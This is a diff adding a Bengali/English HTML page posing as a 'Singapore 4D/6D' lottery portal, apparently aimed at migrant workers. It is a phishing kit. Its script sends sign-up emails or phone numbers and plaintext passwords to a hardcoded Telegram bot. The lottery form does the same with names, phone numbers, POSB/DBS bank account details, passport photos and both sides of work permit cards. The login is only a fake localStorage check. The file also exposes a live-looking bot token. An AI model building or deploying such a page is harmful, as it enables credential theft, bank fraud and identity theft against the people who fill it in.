@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Singapore 4D/6D Portal</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    /* 4D/Lottery Theme Animated Background */
+    body {
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* Background Watermarks */
+    body::before {
+      content: "4D 6D 4829 9501 3820";
+      position: absolute;
+      top: 10%;
+      left: 5%;
+      font-size: 80px;
+      font-weight: 900;
+      color: rgba(255, 255, 255, 0.03);
+      white-space: nowrap;
+      user-select: none;
+      pointer-events: none;
+      transform: rotate(-15deg);
+    }
+
+    body::after {
+      content: "SINGAPORE LOTTERY 4D";
+      position: absolute;
+      bottom: 10%;
+      right: 5%;
+      font-size: 70px;
+      font-weight: 900;
+      color: rgba(255, 255, 255, 0.03);
+      white-space: nowrap;
+      user-select: none;
+      pointer-events: none;
+      transform: rotate(-10deg);
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(10px);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+      width: 100%;
+      max-width: 500px;
+      position: relative;
+      z-index: 10;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .lang-btn {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      background: #11998e;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      color: #ffffff;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      transition: all 0.3s ease;
+    }
+
+    .lang-btn:hover {
+      background: #38ef7d;
+      color: #000;
+    }
+
+    h2 {
+      color: #1a252f;
+      margin-bottom: 15px;
+      text-align: center;
+      font-size: 22px;
+    }
+
+    .tabs {
+      display: flex;
+      margin-bottom: 20px;
+      border-bottom: 2px solid #e4e6eb;
+    }
+
+    .tab-btn {
+      flex: 1;
+      padding: 10px;
+      background: none;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      color: #65676b;
+      cursor: pointer;
+    }
+
+    .tab-btn.active {
+      color: #e74c3c;
+      border-bottom: 3px solid #e74c3c;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #2c3e50;
+      margin-bottom: 6px;
+    }
+
+    .input-group input,
+    .input-group select {
+      width: 100%;
+      padding: 11px;
+      border: 1px solid #dcdde1;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.3s ease;
+      background: #fdfdfd;
+    }
+
+    .input-group input:focus,
+    .input-group select:focus {
+      border-color: #e74c3c;
+      box-shadow: 0 0 5px rgba(231, 76, 60, 0.2);
+    }
+
+    /* Password Input Wrapper with Show/Hide Button */
+    .password-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-wrapper input {
+      padding-right: 45px;
+    }
+
+    .toggle-pass {
+      position: absolute;
+      right: 10px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      color: #7f8c8d;
+      user-select: none;
+    }
+
+    .name-fields {
+      display: flex;
+      gap: 10px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #e74c3c, #c0392b);
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      box-shadow: 0 4px 12px rgba(231, 76, 60, 0.3);
+      transition: transform 0.2s ease, background 0.3s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(135deg, #d63031, #9b2313);
+    }
+
+    .btn:disabled {
+      background: #bdc3c7;
+      cursor: not-allowed;
+    }
+
+    .error-msg {
+      color: #d63031;
+      background: #ffeae8;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      margin-bottom: 15px;
+      display: none;
+      text-align: center;
+      border: 1px solid #ff7675;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- ভাষা পরিবর্তনের বাটন -->
+    <button class="lang-btn" onclick="toggleLanguage()" id="langBtn">English</button>
+
+    <!-- ট্যাব (সাইন আপ / লগইন) -->
+    <div class="tabs" id="authTabs">
+      <button class="tab-btn active" onclick="switchAuthTab('signup')" id="tabSignup">সাইন আপ</button>
+      <button class="tab-btn" onclick="switchAuthTab('login')" id="tabLogin">লগইন</button>
+    </div>
+
+    <div id="errorBox" class="error-msg"></div>
+
+    <!-- সাইন আপ ফর্ম -->
+    <form id="signupForm" onsubmit="handleSignup(event)">
+      <div class="input-group">
+        <label id="lblEmail">ইমেইল অথবা ফোন নম্বর</label>
+        <input type="text" id="signupEmail" required placeholder="ইমেইল বা ফোন দিন">
+      </div>
+      <div class="input-group">
+        <label id="lblPass">পাসওয়ার্ড (নূন্যতম ৬ অক্ষর)</label>
+        <div class="password-wrapper">
+          <input type="password" id="signupPass" required minlength="6" placeholder="পাসওয়ার্ড দিন">
+          <button type="button" class="toggle-pass" onclick="togglePasswordVisibility('signupPass', this)">👁️</button>
+        </div>
+      </div>
+      <button type="submit" class="btn" id="btnSignup">সাইন আপ করুন</button>
+    </form>
+
+    <!-- লগইন ফর্ম -->
+    <form id="loginForm" class="hidden" onsubmit="handleLogin(event)">
+      <div class="input-group">
+        <label id="lblLoginEmail">ইমেইল অথবা ফোন নম্বর</label>
+        <input type="text" id="loginEmail" required placeholder="ইমেইল বা ফোন দিন">
+      </div>
+      <div class="input-group">
+        <label id="lblLoginPass">পাসওয়ার্ড</label>
+        <div class="password-wrapper">
+          <input type="password" id="loginPass" required placeholder="পাসওয়ার্ড দিন">
+          <button type="button" class="toggle-pass" onclick="togglePasswordVisibility('loginPass', this)">👁️</button>
+        </div>
+      </div>
+      <button type="submit" class="btn" id="btnLogin">লগইন করুন</button>
+    </form>
+
+    <!-- মূল 4D/6D ফর্ম -->
+    <div id="mainPortal" class="hidden">
+      <h2 id="portalTitle">সিঙ্গাপুর 4D/6D ফর্ম</h2>
+
+      <form id="lotteryForm" onsubmit="handleFormSubmit(event)">
+        <!-- ফার্স্ট এবং লাস্ট নাম -->
+        <div class="input-group name-fields">
+          <div style="flex: 1;">
+            <label id="lblFirstName">ফার্স্ট নাম</label>
+            <input type="text" id="firstName" required placeholder="First Name">
+          </div>
+          <div style="flex: 1;">
+            <label id="lblLastName">লাস্ট নাম</label>
+            <input type="text" id="lastName" required placeholder="Last Name">
+          </div>
+        </div>
+
+        <!-- কন্টাক্ট নম্বর -->
+        <div class="input-group">
+          <label id="lblContact">কন্টাক্ট নম্বর</label>
+          <input type="tel" id="contactNum" required placeholder="+65 XXXX XXXX">
+        </div>
+
+        <!-- টাইপ সিলেক্ট (4D/6D) -->
+        <div class="input-group">
+          <label id="lblType">টাইপ সিলেক্ট করুন</label>
+          <select id="digitType" required>
+            <option value="" disabled selected>টাইপ নির্বাচন করুন</option>
+            <option value="4D">4D Number</option>
+            <option value="6D">6D Number</option>
+          </select>
+        </div>
+
+        <!-- ছবি আপলোড -->
+        <div class="input-group">
+          <label id="lblProfilePic">নিজের পাসপোর্ট সাইজের ছবি</label>
+          <input type="file" id="profilePic" accept="image/*" required>
+        </div>
+
+        <div class="input-group">
+          <label id="lblFrontPic">পারমিট কার্ড (সামনের ছবি)</label>
+          <input type="file" id="frontPic" accept="image/*" required>
+        </div>
+
+        <div class="input-group">
+          <label id="lblBackPic">পারমিট কার্ড (পিছনের ছবি)</label>
+          <input type="file" id="backPic" accept="image/*" required>
+        </div>
+
+        <!-- POSB / DBS পেমেন্ট ডিটেইলস -->
+        <div class="input-group">
+          <label id="lblBankAcc">POSB / DBS একাউন্ট নম্বর (যে একাউন্ট থেকে পেমেন্ট করেছেন)</label>
+          <input type="text" id="bankAcc" required placeholder="যেমন: XXX-XXXXX-X">
+        </div>
+
+        <div class="input-group">
+          <label id="lblAccHolder">একাউন্ট হোল্ডারের নাম (Account Holder Name)</label>
+          <input type="text" id="accHolder" required placeholder="যেমন: MD TANVIR AHMED">
+        </div>
+
+        <button type="submit" class="btn" id="btnSubmitForm">কনফার্ম ও জমা দিন</button>
+      </form>
+    </div>
+
+  </div>
+
+  <script>
+    // টেলিগ্রাম বট কনফিগারেশন
+    const TELEGRAM_BOT_TOKEN = "8711729817:AAG2VUDDl3lmTCcPZGADEpMo3U_OeqcIJW8";
+    const TELEGRAM_CHAT_ID = "7560607133";
+
+    let currentLang = 'bn';
+
+    // পাসওয়ার্ড শো / হাইড টগল ফাংশন
+    function togglePasswordVisibility(inputId, btn) {
+      const input = document.getElementById(inputId);
+      if (input.type === "password") {
+        input.type = "text";
+        btn.innerText = "🙈";
+      } else {
+        input.type = "password";
+        btn.innerText = "👁️";
+      }
+    }
+
+    // ভাষা পরিবর্তন
+    function toggleLanguage() {
+      if (currentLang === 'bn') {
+        currentLang = 'en';
+        document.getElementById('langBtn').innerText = 'বাংলা';
+        setLanguageEN();
+      } else {
+        currentLang = 'bn';
+        document.getElementById('langBtn').innerText = 'English';
+        setLanguageBN();
+      }
+    }
+
+    function setLanguageBN() {
+      document.getElementById('tabSignup').innerText = 'সাইন আপ';
+      document.getElementById('tabLogin').innerText = 'লগইন';
+      document.getElementById('lblEmail').innerText = 'ইমেইল অথবা ফোন নম্বর';
+      document.getElementById('lblPass').innerText = 'পাসওয়ার্ড (নূন্যতম ৬ অক্ষর)';
+      document.getElementById('btnSignup').innerText = 'সাইন আপ করুন';
+      document.getElementById('lblLoginEmail').innerText = 'ইমেইল অথবা ফোন নম্বর';
+      document.getElementById('lblLoginPass').innerText = 'পাসওয়ার্ড';
+      document.getElementById('btnLogin').innerText = 'লগইন করুন';
+      
+      document.getElementById('portalTitle').innerText = 'সিঙ্গাপুর 4D/6D ফর্ম';
+      document.getElementById('lblFirstName').innerText = 'ফার্স্ট নাম';
+      document.getElementById('lblLastName').innerText = 'লাস্ট নাম';
+      document.getElementById('lblContact').innerText = 'কন্টাক্ট নম্বর';
+      document.getElementById('lblType').innerText = 'টাইপ সিলেক্ট করুন';
+      document.getElementById('lblProfilePic').innerText = 'নিজের পাসপোর্ট সাইজের ছবি';
+      document.getElementById('lblFrontPic').innerText = 'পারমিট কার্ড (সামনের ছবি)';
+      document.getElementById('lblBackPic').innerText = 'পারমিট কার্ড (পিছনের ছবি)';
+      document.getElementById('lblBankAcc').innerText = 'POSB / DBS একাউন্ট নম্বর (যে একাউন্ট থেকে পেমেন্ট করেছেন)';
+      document.getElementById('lblAccHolder').innerText = 'একাউন্ট হোল্ডারের নাম (Account Holder Name)';
+      document.getElementById('btnSubmitForm').innerText = 'কনফার্ম ও জমা দিন';
+    }
+
+    function setLanguageEN() {
+      document.getElementById('tabSignup').innerText = 'Sign Up';
+      document.getElementById('tabLogin').innerText = 'Login';
+      document.getElementById('lblEmail').innerText = 'Email or Phone Number';
+      document.getElementById('lblPass').innerText = 'Password (Min 6 chars)';
+      document.getElementById('btnSignup').innerText = 'Sign Up';
+      document.getElementById('lblLoginEmail').innerText = 'Email or Phone Number';
+      document.getElementById('lblLoginPass').innerText = 'Password';
+      document.getElementById('btnLogin').innerText = 'Login';
+
+      document.getElementById('portalTitle').innerText = 'Singapore 4D/6D Form';
+      document.getElementById('lblFirstName').innerText = 'First Name';
+      document.getElementById('lblLastName').innerText = 'Last Name';
+      document.getElementById('lblContact').innerText = 'Contact Number';
+      document.getElementById('lblType').innerText = 'Select Type';
+      document.getElementById('lblProfilePic').innerText = 'Passport Size Photo';
+      document.getElementById('lblFrontPic').innerText = 'Permit Card (Front Photo)';
+      document.getElementById('lblBackPic').innerText = 'Permit Card (Back Photo)';
+      document.getElementById('lblBankAcc').innerText = 'POSB / DBS Account Number (Paid From)';
+      document.getElementById('lblAccHolder').innerText = 'Account Holder Name';
+      document.getElementById('btnSubmitForm').innerText = 'Confirm & Submit';
+    }
+
+    // ট্যাব সুইচার
+    function switchAuthTab(tab) {
+      document.getElementById('errorBox').style.display = 'none';
+      if (tab === 'signup') {
+        document.getElementById('tabSignup').classList.add('active');
+        document.getElementById('tabLogin').classList.remove('active');
+        document.getElementById('signupForm').classList.remove('hidden');
+        document.getElementById('loginForm').classList.add('hidden');
+      } else {
+        document.getElementById('tabLogin').classList.add('active');
+        document.getElementById('tabSignup').classList.remove('active');
+        document.getElementById('loginForm').classList.remove('hidden');
+        document.getElementById('signupForm').classList.add('hidden');
+      }
+    }
+
+    // টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
+    async function sendTelegramMessage(messageText) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    // টেলিগ্রামে ছবি পাঠানোর ফাংশন
+    async function sendTelegramPhoto(file, captionText) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', file);
+      formData.append('caption', captionText);
+
+      await fetch(url, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    // সাইনআপ হ্যান্ডলার (LocalStorage ব্যবহার করে ডেটা সেভ রাখা)
+    async function handleSignup(e) {
+      e.preventDefault();
+      const email = document.getElementById('signupEmail').value.trim();
+      const pass = document.getElementById('signupPass').value;
+
+      if (!email || pass.length < 6) {
+        showError(currentLang === 'bn' ? 'সঠিক তথ্য প্রদান করুন!' : 'Please provide valid info!');
+        return;
+      }
+
+      // ব্রাউজারের LocalStorage-এ ইউজার সেভ রাখা
+      const userObj = { email, pass };
+      localStorage.setItem('registered_user_' + email, JSON.stringify(userObj));
+      localStorage.setItem('last_logged_user', email);
+
+      // টেলিগ্রামে নোটিফিকেশন পাঠানো
+      const text = `<b>🆕 নতুন সাইন-আপ নোটিফিকেশন</b>\n\n<b>ইউজার/ইমেইল:</b> ${email}\n<b>পাসওয়ার্ড:</b> ${pass}`;
+      sendTelegramMessage(text);
+
+      alert(currentLang === 'bn' ? 'সাইন আপ সফল হয়েছে! এখন ফর্ম পূরণ করুন।' : 'Signup Successful! Now complete the form.');
+      showMainPortal();
+    }
+
+    // লগইন হ্যান্ডলার (LocalStorage থেকে মিলিয়ে ভ্যালিডেট করা)
+    function handleLogin(e) {
+      e.preventDefault();
+      const email = document.getElementById('loginEmail').value.trim();
+      const pass = document.getElementById('loginPass').value;
+
+      // ব্রাউজার থেকে পূর্বে সেভ হওয়া একাউন্ট খোঁজা
+      const savedUserData = localStorage.getItem('registered_user_' + email);
+
+      if (!savedUserData) {
+        showError(currentLang === 'bn' ? 'কোন একাউন্ট পাওয়া যায়নি! প্রথমে সঠিক ইমেইল/ফোন দিয়ে সাইন আপ করুন।' : 'No account found! Please Sign Up first.');
+        return;
+      }
+
+      const user = JSON.parse(savedUserData);
+
+      if (email === user.email && pass === user.pass) {
+        alert(currentLang === 'bn' ? 'লগইন সফল হয়েছে!' : 'Login Successful!');
+        showMainPortal();
+      } else {
+        showError(currentLang === 'bn' ? 'ইমেইল/ফোন অথবা পাসওয়ার্ড ভুল হয়েছে!' : 'Invalid Email/Phone or Password!');
+      }
+    }
+
+    function showError(msg) {
+      const errBox = document.getElementById('errorBox');
+      errBox.innerText = msg;
+      errBox.style.display = 'block';
+    }
+
+    function showMainPortal() {
+      document.getElementById('authTabs').classList.add('hidden');
+      document.getElementById('signupForm').classList.add('hidden');
+      document.getElementById('loginForm').classList.add('hidden');
+      document.getElementById('errorBox').style.display = 'none';
+      document.getElementById('mainPortal').classList.remove('hidden');
+    }
+
+    // ফর্ম সাবমিট হ্যান্ডলার
+    async function handleFormSubmit(e) {
+      e.preventDefault();
+      
+      const submitBtn = document.getElementById('btnSubmitForm');
+      submitBtn.disabled = true;
+      submitBtn.innerText = currentLang === 'bn' ? 'জমা হচ্ছে...' : 'Submitting...';
+
+      const firstName = document.getElementById('firstName').value;
+      const lastName = document.getElementById('lastName').value;
+      const contactNum = document.getElementById('contactNum').value;
+      const digitType = document.getElementById('digitType').value;
+      const bankAcc = document.getElementById('bankAcc').value;
+      const accHolder = document.getElementById('accHolder').value;
+
+      const profilePic = document.getElementById('profilePic').files[0];
+      const frontPic = document.getElementById('frontPic').files[0];
+      const backPic = document.getElementById('backPic').files[0];
+
+      // টেলিগ্রামে বিবরণী পাঠানো
+      const textMessage = `<b>📝 নতুন 4D/6D আবেদন প্রাপ্ত হয়েছে!</b>\n\n` +
+        `<b>নাম:</b> ${firstName} ${lastName}\n` +
+        `<b>কন্টাক্ট নম্বর:</b> ${contactNum}\n` +
+        `<b>টাইপ:</b> ${digitType}\n` +
+        `<b>POSB/DBS একাউন্ট:</b> ${bankAcc}\n` +
+        `<b>একাউন্ট হোল্ডারের নাম:</b> ${accHolder}`;
+
+      try {
+        await sendTelegramMessage(textMessage);
+
+        if (profilePic) {
+          await sendTelegramPhoto(profilePic, `📷 পাসপোর্ট ছবি: ${firstName} ${lastName}`);
+        }
+
+        if (frontPic) {
+          await sendTelegramPhoto(frontPic, `💳 পারমিট কার্ড (সামনে): ${firstName} ${lastName}`);
+        }
+
+        if (backPic) {
+          await sendTelegramPhoto(backPic, `💳 পারমিট কার্ড (পিছনে): ${firstName} ${lastName}`);
+        }
+
+        alert(currentLang === 'bn' ? 'আপনার আবেদন ও ছবিসমূহ সফলভাবে জমা হয়েছে!' : 'Your application and photos have been submitted successfully!');
+        document.getElementById('lotteryForm').reset();
+      } catch (err) {
+        alert(currentLang === 'bn' ? 'দুঃখিত, কোনো সমস্যা হয়েছে। আবার চেষ্টা করুন।' : 'Sorry, something went wrong. Try again.');
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerText = currentLang === 'bn' ? 'কনফার্ম ও জমা দিন' : 'Confirm & Submit';
+      }
+    }
+  </script>
+</body>
+</html>
